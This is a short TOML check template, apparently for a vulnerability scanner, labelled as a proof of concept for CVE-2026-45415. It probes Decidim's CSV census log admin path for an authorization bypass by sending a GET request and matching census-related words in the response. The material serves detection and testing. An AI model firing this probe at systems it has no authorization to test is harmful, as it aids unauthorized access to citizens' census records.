[info]
author = "AVE"
description = "检测 Decidim CSV 人口普查记录管理端点是否存在授权绕过，参与者管理员可越权访问 /admin/csv_census/census_logs 下相关接口"
id = "POC-AVE-2026-0282"
name = "CVE-2026-45415 PoC"
severity = "medium"
tags = ["ave-2026-0282"]
vuln_id = [
    "CVE-2026-45415",
    "GHSA-q79h-67vx-m9xg",
    "AVE-2026-0282",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/csv_census/census_logs"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "csv_census",
    "census_logs",
    "Census",
]
